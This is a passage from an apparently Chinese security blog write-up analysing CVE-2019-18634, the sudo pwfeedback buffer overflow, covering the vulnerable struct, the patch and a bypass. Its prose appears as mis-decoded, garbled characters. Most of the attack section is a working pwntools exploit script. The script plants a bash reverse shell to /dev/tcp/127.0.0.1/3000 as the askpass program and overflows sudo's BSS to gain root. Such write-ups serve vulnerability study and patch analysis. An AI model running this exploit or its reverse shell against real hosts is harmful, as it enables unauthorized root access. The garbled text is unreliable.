</div><p>æœ€å¼€å§‹æœ‰<code>child = sudo_debug_fork()</code>;æ­¤å¤„ç¨‹åºforkäº†ä¸€ä¸ªå­çº¿ç¨‹,è€Œå­çº¿ç¨‹çš„æƒé™æ¥è‡ªäº<code>user_details</code>å³ä¹‹å‰å¯ä»¥è¶Šç•Œä¿®æ”¹çš„<code>user_details_0</code>çš„æ•°æ®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">user_details</span> <span class="p">{</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">ppid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">pgid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">tcpgid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">sid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">euid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">gid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">egid</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cwd</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tty</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shell</span><span class="p">;</span>
    <span class="n">GETGROUPS_T</span> <span class="o">*</span><span class="n">groups</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ngroups</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ts_cols</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ts_lines</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p><code>user_details</code>ç»“æ„ä½“åŒ…æ‹¬äº†è¿›ç¨‹çš„UIDä»¥åŠPID,è‹¥å°†å…¶ç½®0,åˆ™å­è¿›ç¨‹å˜ä¸ºrootæƒé™,ä¹‹åä¼šä»¥rootæƒé™<code>execl(askpass, askpass, prompt, (char *)NULL);</code>æ‰§è¡ŒaskpassæŒ‡å‘çš„æ–‡ä»¶</p>
<h4 id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</h4>
<ol>
<li>sudoè¾“å…¥å…·æœ‰ä¸‰æ¬¡è¾“å…¥çš„æœºä¼š</li>
<li>å¦‚æœå¼€å¯äº†pwfeedback,ç¨‹åºä¼šåˆ©ç”¨tgetpasså‡½æ•°ä¸­çš„getlnå‡½æ•°è¿›è¡Œè¾“å…¥,è€Œgetlnå‡½æ•°åœ¨pwfeedbackå¼€å¯æ—¶å­˜åœ¨BSSæ•°æ®è¶Šç•Œ</li>
<li>åœ¨sudo_askpasså‡½æ•°ä¸­,ä¼šforkä¸€ä¸ªå­çº¿ç¨‹,ä»¥å­çº¿ç¨‹çš„æƒé™è¿è¡Œä¸€ä¸ªaskpassæŒ‡å‘çš„ç¨‹åº</li>
</ol>
<h4 id="æ€è·¯æ€»ç»“-1">æ€è·¯æ€»ç»“</h4>
<ol>
<li>ç¬¬ä¸€æ¬¡è¾“å…¥ä¿®æ”¹<code>tgetpass_flags |= TGP_ASKPASS</code>,ç„¶åç»§ç»­æº¢å‡ºä¿®æ”¹<code>user_details_0</code>ä¸ºrootæƒé™</li>
<li>ç¬¬äºŒæ¬¡å°±ä¼šæ£€æµ‹åˆ°å­˜åœ¨<code>TGP_ASKPASS</code>ä»è€Œè°ƒç”¨<code>sudo_askpass</code>å‡½æ•°,è¿›è€Œæ‰§è¡Œ<code>askpassæŒ‡é’ˆ</code>æŒ‡å‘çš„æ–‡ä»¶</li>
<li>æœ€ç»ˆé€šè¿‡åå¼¹shellçš„æ–¹å¼æ‹¿åˆ°shell</li>
</ol>
<h4 id="patch-in-1826">Patch in 1.8.26</h4>
<p>åœ¨1.8.26ä¹‹åçš„getlnä¸­æ·»åŠ äº†å¯¹EOFçš„å¤„ç†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp">        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_eof</span><span class="p">)</span> <span class="p">{</span>
		    <span class="n">nr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		    <span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æ­¤POC1ä¸èµ·ä½œç”¨äº†,ä½†æ˜¯è‹¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼ªç»ˆç«¯å¯¹,ä»ä¼ªç»ˆç«¯è·å–è¾“å…¥æµ<br>
åœ¨ASCIIä¸­,EOFä¸KILLå¯¹åº”çš„å€¼åˆ†åˆ«ä¸º0x04ä¸0x15,åˆ™ç¨å¾®ä¿®æ”¹ä¸€ä¸ªPOCæ¼æ´å°±å¯ä»¥å†æ¬¡åˆ©ç”¨</p>
<h4 id="exploitè„šæœ¬">Exploitè„šæœ¬</h4>
<p>å¦‚æœé€šè¿‡ç®¡é“ä¼ è¾“æ•°æ®,<code>sudo_term_kill</code>åˆå§‹åŒ–ä¸º<code>\x00</code>,å°†ä¼šå¯¼è‡´æº¢å‡ºåˆ°user_details_0ä¹‹å‰,signoä¸èƒ½ç½®0,å¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ä»è€ŒKILLè¿›ç¨‹</p>
<p>è€Œé€šè¿‡ç»ˆç«¯ä¼ è¾“æ•°æ®,<code>sudo_term_kill</code>æ˜¯ä¸º<code>\x15</code>çš„,åˆ™ä¼˜é€‰ptyä½œä¸ºè¾“å…¥æ–¹å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding=utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">os</span>

<span class="n">TARGET</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="s2">&#34;/tmp/build/bin/sudo&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setFlags</span><span class="p">(</span><span class="n">flags</span><span class="p">):</span>
	<span class="n">tgetpassFlags</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s2">&#34;TGP_NOECHO&#34;</span><span class="p">:</span><span class="mh">0x00</span><span class="p">,</span>
		<span class="s2">&#34;TGP_ECHO&#34;</span><span class="p">:</span><span class="mh">0x01</span><span class="p">,</span>
		<span class="s2">&#34;TGP_STDIN&#34;</span><span class="p">:</span><span class="mh">0x02</span><span class="p">,</span>
		<span class="s2">&#34;TGP_ASKPASS&#34;</span><span class="p">:</span><span class="mh">0x04</span><span class="p">,</span>
		<span class="s2">&#34;TGP_MASK&#34;</span><span class="p">:</span><span class="mh">0x08</span><span class="p">,</span>
		<span class="s2">&#34;TGP_NOECHO_TRY&#34;</span><span class="p">:</span><span class="mh">0x10</span>
	<span class="p">}</span>
	<span class="n">flags</span> <span class="o">=</span> <span class="n">flags</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;|&#34;</span><span class="p">)</span>
	<span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
		<span class="n">retval</span> <span class="o">|=</span> <span class="n">tgetpassFlags</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
	<span class="k">return</span> <span class="n">retval</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>

	<span class="n">shell_path</span> <span class="o">=</span> <span class="s2">&#34;/tmp/root.sh&#34;</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
		<span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span>
		<span class="s1">&#39;&#39;&#39;#!/bin/bash
</span><span class="s1">		bash -c &#34;bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1&#34;
</span><span class="s1">		&#39;&#39;&#39;</span><span class="p">)</span>
	<span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span><span class="mi">0</span><span class="n">o777</span><span class="p">)</span>
	<span class="n">mfd</span><span class="p">,</span> <span class="n">sfd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">openpty</span><span class="p">()</span>
	<span class="n">fd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">ttyname</span><span class="p">(</span><span class="n">sfd</span><span class="p">),</span> <span class="n">os</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span>
	
	<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">TARGET</span><span class="p">,</span><span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">],</span><span class="n">stdin</span><span class="o">=</span><span class="n">fd</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;SUDO_ASKPASS&#34;</span><span class="p">:</span><span class="n">shell_path</span><span class="p">})</span>
	<span class="n">port</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">)</span>
	<span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00\x15</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xFF</span>  <span class="c1">#buf</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00\x15</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x20</span> 	<span class="c1">#askpass_link</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00\x15</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x105</span> <span class="c1">#signo</span>
	<span class="n">payload</span> <span class="o">+=</span>  <span class="n">p64</span><span class="p">(</span><span class="n">setFlags</span><span class="p">(</span><span class="s2">&#34;TGP_STDIN|TGP_ASKPASS&#34;</span><span class="p">))</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x15\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x14</span>  <span class="c1">#tgetpass_flags</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x15\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x30</span>  <span class="c1">#user_details</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
	<span class="n">pause</span><span class="p">()</span>
	<span class="n">os</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">mfd</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">port</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
	<span class="n">pause</span><span class="p">()</span>
	<span class="n">port</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="reference">Reference</h3>
<p><a href="https://xz.aliyun.com/t/7622">[CVE-2019-18634æ¼æ´å¤ç°ä¸åˆ†æ]</a><br>
<a href="https://www.anquanke.com/post/id/198481?from=timeline">[CVE-2019-18634 sudo ææƒæ¼æ´åˆ†æ]</a>
<a href="../attachment/CVE-2019-18634.zip">[CVE-2019-18634é™„ä»¶]</a></p>
<h3 id="æ€»ç»“">æ€»ç»“</h3>
<p>Sudoä¸Šè¿°ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯ç¼“å†²åŒºæº¢å‡º,ä¸€ä¸ªåœ¨BSSæ®µä¸Šæº¢å‡º,æº¢å‡ºä¿®æ”¹user_detailsç»“æ„ä½“,å¯¼è‡´fork()çš„å­è¿›ç¨‹ä¸ºrootæƒé™,ä¸€ä¸ªåœ¨å †ä¸Šçš„æº¢å‡º,é€šè¿‡æ§åˆ¶ç¯å¢ƒå˜é‡,ç„¶åè¦†ç›–å­—ç¬¦ä¸²æŒ‡é’ˆä»è€Œå®ç°soæ–‡ä»¶æ³¨å…¥è¿è¡Œrootæƒé™çš„shell
â—” â€¸â—”</p>

    </div>
</div>

<div class="container">
    
    <nav class="flex container suggested">
        
        <a rel="prev" href="/articles/%E9%80%9A%E8%BF%87dasctfhws%E8%B5%9B%E9%A2%98babycall%E6%9D%A5%E6%8E%A2%E7%A9%B6%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4/" title="Previous post (older)">
            <span>Previous</span>
            é€šè¿‡DASCTF&amp;HWSèµ›é¢˜babycallæ¥æ¢ç©¶ç»•è¿‡KPTIä¿æŠ¤
            </a>
        
        
        
        <a rel="next" href="/articles/qwb2021-notebook/" title="Next post (newer)">
            <span>Next</span>
            2021å¹´ç¬¬äº”å±Šå¼ºç½‘æ¯-NoteBook
            </a> 
        
    </nav>
    
</div>
</main>


        </main>
        <footer class="footer flex">
    <section class="container">
        <nav class="footer-links">
            
            <a href="/index.xml">RSS</a>
            
        </nav>
    </section>
    
    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
</footer>
    </body>
</html>